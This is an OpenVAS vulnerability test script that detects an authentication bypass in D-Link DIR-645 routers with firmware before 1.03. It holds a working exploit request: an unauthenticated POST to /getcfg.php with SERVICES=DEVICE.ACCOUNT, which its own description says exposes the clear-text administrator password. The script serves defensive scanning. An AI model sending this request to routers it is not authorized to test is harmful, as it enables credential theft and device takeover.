###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_dlink_dir645_auth_bypass_vuln.nasl 6698 2017-07-12 12:00:17Z cfischer $
#
# D-Link DIR-645 Router Authentication Bypass Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803174");
  script_version("$Revision: 6698 $");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-07-12 14:00:17 +0200 (Wed, 12 Jul 2017) $");
  script_tag(name:"creation_date", value:"2013-03-01 12:01:42 +0530 (Fri, 01 Mar 2013)");
  script_name("D-Link DIR-645 Router Authentication Bypass Vulnerability");

  script_xref(name:"URL", value:"http://seclists.org/bugtraq/2013/Feb/150");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/120591");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 8080);
  script_mandatory_keys("DIR-645/banner");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to retrieve the administrator
  password and then access the device with full privileges. This will allow an
  attacker to launch further attacks.
  Impact Level: Application");
  script_tag(name:"affected", value:"D-Link DIR-645 firmware version prior to 1.03");
  script_tag(name:"insight", value:"The web interface of D-Link DIR-645 routers expose several pages accessible
  with no authentication. These pages can be abused to access sensitive
  information concerning the device configuration, including the clear-text
  password for the administrative user.");
  script_tag(name:"solution", value:"Upgrade to D-Link DIR-645 firmware version 1.03 or later,
  For updates refer to http://www.dlink.com/ca/en/home-solutions/connect/routers/dir-645-wireless-n-home-router-1000");
  script_tag(name:"summary", value:"This host is running D-Link DIR-645 Router and is prone to
  authentication bypass vulnerability.");

  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = "";
req = "";
res = "";
banner = "";

## Get HTTP Port
port = get_http_port(default:8080);

## Get Host name
host = http_host_name(port:port);

## Confirm the device from banner
banner = get_http_banner(port: port);
if(banner && "DIR-645" >!< banner){
  exit(0);
}

## Send and Receive the response
res = http_get_cache(item: "/", port:port);

## Confirm the device from response
if(">D-LINK SYSTEMS" >< res &&   ">DIR-645<" >< res)
{
  postdata = "SERVICES=DEVICE.ACCOUNT";

  ## Construct attack request
  req = string("POST /getcfg.php HTTP/1.1\r\n",
               "Host: ", host, "\r\n",
               "Content-Type: application/x-www-form-urlencoded\r\n",
               "Content-Length: ", strlen(postdata), "\r\n",
               "\r\n", postdata);

  res = http_keepalive_send_recv(port:port, data:req);

  ## Confirm exploit worked by checking the response
  if(res && ">DEVICE.ACCOUNT<" >< res && "name>DIR-645<" >< res)
  {
    security_message(port:port);
    exit(0);
  }
}

exit(99);
